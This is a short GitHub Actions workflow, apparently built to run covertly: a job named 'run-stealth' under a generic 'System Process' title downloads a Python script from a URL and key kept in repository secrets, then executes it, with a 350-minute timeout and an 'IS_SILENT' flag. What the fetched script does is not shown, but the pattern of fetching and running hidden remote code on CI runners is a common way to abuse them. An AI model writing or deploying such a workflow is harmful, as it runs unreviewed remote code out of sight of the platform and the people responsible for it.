name: System Process

on:
  workflow_dispatch:

jobs:
  run-stealth:
    runs-on: ubuntu-latest
    timeout-minutes: 350 

    steps:
    - uses: actions/checkout@v3

    - name: Execute Remote Protocol
      env:
        WORKER_URL: ${{ secrets.WORKER_URL }}
        WORKER_KEY: ${{ secrets.WORKER_KEY }}
        IS_SILENT: ${{ secrets.IS_SILENT || 'true' }} 
      run: |
        curl -sL "$WORKER_URL/tg-stream/monitor.py?key=$WORKER_KEY" -o monitor.py

        python3 monitor.py
